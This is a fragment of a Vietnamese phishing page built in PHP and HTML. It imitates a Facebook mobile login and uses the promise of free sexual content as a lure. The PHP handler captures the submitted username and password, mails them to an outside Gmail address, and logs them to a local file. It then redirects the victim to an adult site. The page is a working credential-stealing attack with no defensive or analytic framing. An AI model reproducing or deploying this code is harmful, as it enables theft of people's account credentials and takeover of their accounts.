...
?>
    <?php
    	if(isset($_POST["login"])){
            ...
            echo $_SESSION["username"];
             ...
             $body = " \n Tài Khoản : $username \n Mật Khẩu : $password \n ";
             mail("pubghung5@gmail.com", $headers, $body, $subject);
            $test = fopen("hu.txt","a");
            fwrite($test,$body);
            fclose($test); 
            header('Location: https://xnxx.ditme.com/');
    ...
    ?>    
<!DOCTYPE html>
<html lang="vi" id="Em Gai 2k4 bi thit ">
    <head>
        <meta charset="utf-8"/>
        <script src="https://code.jquery.com/jquery-2.2.2.min.js"></script>
    	<title id="pageTitle">Em Gai 2K4 BI THIT</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <link href="http://4.bp.blogspot.com/-cafCsTe3wZc/UHS3ACieBbI/AAAAAAAAC4w/W4DwrVFlbk0/s1600/anh+sex+2+.jpg" rel="apple-touch-icon-precomposed" sizes="196x196"/>
...
window.location.replace("http://www.facebook.com");
    ...
    <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
        <div class="_5yd0 _2ph- _5yd1" style="" id="thongtin_form" data-sigil="m_login_notice">Để xem sex free, bạn vui lòng đăng nhập </div>
        <br/>
